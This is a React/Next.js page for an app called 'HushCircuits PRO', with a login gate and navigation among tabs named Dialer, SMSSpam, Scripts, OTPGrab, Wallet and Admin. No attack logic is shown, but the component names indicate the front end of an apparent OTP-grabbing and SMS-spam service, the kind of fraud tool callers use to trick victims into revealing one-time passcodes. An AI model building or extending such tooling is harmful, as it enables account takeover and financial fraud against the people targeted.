"use client";

import { useState } from "react";
import { AnimatePresence, motion } from "framer-motion";
import { useAuth } from "@/lib/auth";
import LoginOverlay from "@/components/LoginOverlay";
import Dialer from "@/components/Dialer";
import SMSSpam from "@/components/SMSSpam";
import Scripts from "@/components/Scripts";
import Stats from "@/components/Stats";
import Wallet from "@/components/Wallet";
import Settings from "@/components/Settings";
import Admin from "@/components/Admin";
import OTPGrab from "@/components/OTPGrab";

type Tab = "dialer" | "sms" | "scripts" | "otp" | "stats" | "wallet" | "settings" | "admin";

const tabs: { id: Tab; icon: JSX.Element; label: string }[] = [
  { id: "dialer", icon: <PhoneIcon />, label: "Dialer" },
  { id: "sms", icon: <SmsIcon />, label: "SMS" },
  { id: "scripts", icon: <ScriptIcon />, label: "Scripts" },
  { id: "otp", icon: <TargetIcon />, label: "OTP" },
  { id: "stats", icon: <StatsIcon />, label: "Stats" },
  { id: "wallet", icon: <WalletIcon />, label: "Wallet" },
  { id: "settings", icon: <SettingsIcon />, label: "Settings" },
  { id: "admin", icon: <AdminIcon />, label: "Admin" },
];

function PhoneIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
    </svg>
  );
}
function SmsIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
    </svg>
  );
}
function ScriptIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/>
    </svg>
  );
}
function TargetIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>
    </svg>
  );
}
function StatsIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/>
    </svg>
  );
}
function WalletIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/>
    </svg>
  );
}
function SettingsIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>
    </svg>
  );
}
function AdminIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>
    </svg>
  );
}

export default function Home() {
  const { token, email, isAdmin, logout, isLoading } = useAuth();
  const [tab, setTab] = useState<Tab>("dialer");

  if (isLoading) {
    return (
      <div className="h-full flex items-center justify-center bg-[#050505]">
        <motion.div
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 1, scale: 1 }}
          className="flex flex-col items-center gap-4"
        >
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
            className="w-10 h-10 border-2 border-red-500/30 border-t-red-500 rounded-full"
          />
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5 }}
            className="text-[#525252] text-xs font-mono"
          >
            Loading HushCircuits...
          </motion.div>
        </motion.div>
      </div>
    );
  }

  if (!token) {
    return <LoginOverlay />;
  }

  return (
    <div className="h-full flex flex-col bg-[#050505] relative overflow-hidden">
      {/* Background gradient orbs */}
      <div className="fixed inset-0 pointer-events-none z-0">
        <motion.div
          animate={{
            x: [0, 50, -30, 0],
            y: [0, -40, 30, 0],
          }}
          transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
          className="absolute top-0 right-0 w-[600px] h-[600px] bg-red-600/[0.03] rounded-full blur-[150px]"
        />
        <motion.div
          animate={{
            x: [0, -40, 20, 0],
            y: [0, 30, -20, 0],
          }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
          className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-purple-600/[0.03] rounded-full blur-[150px]"
        />
      </div>

      {/* Header */}
      <motion.header
        initial={{ y: -20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        className="relative z-10 flex items-center justify-between px-4 py-2.5 border-b border-white/[0.04] bg-[#050505]/80 backdrop-blur-xl"
      >
        <div className="flex items-center gap-2.5">
          <motion.div
            whileHover={{ scale: 1.05 }}
            transition={{ type: "spring", stiffness: 400, damping: 20 }}
            className="relative"
          >
            <div className="w-7 h-7 rounded-md bg-gradient-to-br from-red-500 to-red-700 flex items-center justify-center shadow-lg shadow-red-500/20">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
              </svg>
            </div>
          </motion.div>
          <div>
            <span className="text-white text-sm font-semibold tracking-tight">HUSH</span>
            <span className="text-red-500 text-sm font-semibold">CIRCUITS</span>
          </div>
          <motion.span
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.3 }}
            className="bg-red-500/10 text-red-400 text-[9px] px-1.5 py-0.5 rounded-full font-bold tracking-wider border border-red-500/20"
          >
            PRO
          </motion.span>
        </div>
        <div className="flex items-center gap-3">
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.2 }}
            className="flex items-center gap-1.5"
          >
            <div className="status-dot" />
            <span className="text-[#525252] text-[10px] font-mono">LIVE</span>
          </motion.div>
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.3 }}
            className="text-[#525252] text-[10px] font-mono max-w-[100px] truncate"
          >
            {email}
          </motion.div>
          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={logout}
            className="text-[#525252] hover:text-red-400 transition-colors text-[10px] uppercase tracking-wider font-mono"
          >
            Exit
          </motion.button>
        </div>
      </motion.header>

      {/* Main content */}
      <main className="relative z-10 flex-1 overflow-y-auto px-4 py-4" style={{ scrollbarGutter: "stable" }}>
        <AnimatePresence mode="wait">
          <motion.div
            key={tab}
            initial={{ opacity: 0, y: 8, filter: "blur(4px)" }}
            animate={{ opacity: 1, y: 0, filter: "blur(0px)" }}
            exit={{ opacity: 0, y: -8, filter: "blur(4px)" }}
            transition={{ duration: 0.2, ease: [0.22, 1, 0.36, 1] }}
          >
            {tab === "dialer" && <Dialer />}
            {tab === "sms" && <SMSSpam />}
            {tab === "scripts" && <Scripts />}
            {tab === "otp" && <OTPGrab />}
            {tab === "stats" && <Stats />}
            {tab === "wallet" && <Wallet />}
            {tab === "settings" && <Settings />}
            {tab === "admin" && <Admin />}
          </motion.div>
        </AnimatePresence>
      </main>

      {/* Bottom navigation */}
      <motion.nav
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.1 }}
        className="relative z-10 flex items-center justify-around border-t border-white/[0.04] bg-[#050505]/90 backdrop-blur-xl py-1.5 px-1 safe-area-inset-bottom"
      >
        {tabs.filter(t => t.id !== "admin" || isAdmin).map((t) => (
          <motion.button
            key={t.id}
            onClick={() => setTab(t.id)}
            whileTap={{ scale: 0.9 }}
            className={`relative flex flex-col items-center gap-0.5 px-2.5 py-1.5 rounded-xl transition-all duration-200 ${
              tab === t.id
                ? "text-red-500"
                : "text-[#525252] hover:text-[#737373]"
            }`}
          >
            {tab === t.id && (
              <motion.div
                layoutId="activeTab"
                className="absolute inset-0 bg-red-500/10 rounded-xl border border-red-500/20"
                transition={{ type: "spring", stiffness: 400, damping: 30 }}
              />
            )}
            <span className="relative z-10">{t.icon}</span>
            <span className="relative z-10 text-[9px] uppercase tracking-wider font-medium">{t.label}</span>
          </motion.button>
        ))}
      </motion.nav>
    </div>
  );
}
